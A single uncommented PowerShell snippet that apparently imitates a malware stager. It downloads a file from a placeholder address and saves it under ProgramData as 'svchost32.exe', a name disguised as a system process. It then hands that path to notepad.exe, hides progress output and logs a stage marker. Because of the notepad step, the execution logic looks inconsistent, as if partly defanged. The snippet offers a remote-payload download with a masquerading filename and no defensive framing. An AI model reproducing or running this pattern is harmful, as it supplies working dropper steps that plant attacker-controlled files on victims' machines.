
$Stage2Url = "http://192.0.2.40:80/update.dat"; $PayloadPath = "C:\ProgramData\svchost32.exe"; Invoke-WebRequest -Uri $Stage2Url -OutFile $PayloadPath -UseBasicParsing; Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath; Write-Verbose "stage marker 39 reached"; $ProgressPreference = "SilentlyContinue"
